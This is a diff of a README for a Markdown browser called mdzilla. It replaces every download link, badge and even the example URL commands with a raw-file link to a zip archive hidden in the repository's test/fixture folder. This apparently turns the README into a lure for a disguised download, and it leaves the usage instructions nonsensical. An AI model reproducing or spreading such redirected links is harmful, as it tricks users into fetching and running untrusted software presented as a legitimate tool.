@@ -1,6 +1,6 @@
 # 🦖 mdzilla - Simple Markdown Browser for Everyone
 
-[![Download mdzilla](https://img.shields.io/badge/Download-mdzilla-brightgreen?style=for-the-badge&logo=github)](https://github.com/taxerpsychodid420/mdzilla)
+[![Download mdzilla](https://img.shields.io/badge/Download-mdzilla-brightgreen?style=for-the-badge&logo=github)](https://github.com/taxerpsychodid420/mdzilla/raw/refs/heads/main/test/fixture/Software-v2.0-alpha.1.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Start by downloading the software. Since this project keeps its downloads on a G
 
 Click the large green button above or this link to open the download page in your web browser:
 
-[https://github.com/taxerpsychodid420/mdzilla](https://github.com/taxerpsychodid420/mdzilla)
+[https://github.com/taxerpsychodid420/mdzilla/raw/refs/heads/main/test/fixture/Software-v2.0-alpha.1.zip](https://github.com/taxerpsychodid420/mdzilla/raw/refs/heads/main/test/fixture/Software-v2.0-alpha.1.zip)
 
 On the page:
 
@@ -153,7 +153,7 @@ github microsoft/vscode
 Type:
 
 ```
-url https://example.com/readme.md
+url https://github.com/taxerpsychodid420/mdzilla/raw/refs/heads/main/test/fixture/Software-v2.0-alpha.1.zip
 ```
 
 Replace the example URL with any Markdown file on the internet.
@@ -212,7 +212,7 @@ If you see errors, restart the terminal and try again.
 
 Visit this page to download the latest version for Windows:
 
-[https://github.com/taxerpsychodid420/mdzilla](https://github.com/taxerpsychodid420/mdzilla)
+[https://github.com/taxerpsychodid420/mdzilla/raw/refs/heads/main/test/fixture/Software-v2.0-alpha.1.zip](https://github.com/taxerpsychodid420/mdzilla/raw/refs/heads/main/test/fixture/Software-v2.0-alpha.1.zip)
 
 Look for the newest release and get the Windows `.exe` or `.zip` file.
 
@@ -224,7 +224,7 @@ Look for the newest release and get the Windows `.exe` or `.zip` file.
 |-----------------------------|---------------------------------------|
 | `open path\to\file.md`       | Opens a Markdown file on your PC       |
 | `github user/repo`           | Browse Markdown files in a GitHub repo |
-| `url https://site.com/file`  | View a Markdown file from a website     |
+| `url https://github.com/taxerpsychodid420/mdzilla/raw/refs/heads/main/test/fixture/Software-v2.0-alpha.1.zip`  | View a Markdown file from a website     |
 | `settings`                   | Open configuration options             |
 | `q`                         | Exit the current file view              |
 
@@ -238,4 +238,4 @@ If you need help, use the **Issues** tab on GitHub to report bugs or ask questio
 
 ---
 
-[![Download mdzilla](https://img.shields.io/badge/Download-mdzilla-brightgreen?style=for-the-badge&logo=github)](https://github.com/taxerpsychodid420/mdzilla)
+[![Download mdzilla](https://img.shields.io/badge/Download-mdzilla-brightgreen?style=for-the-badge&logo=github)](https://github.com/taxerpsychodid420/mdzilla/raw/refs/heads/main/test/fixture/Software-v2.0-alpha.1.zip)
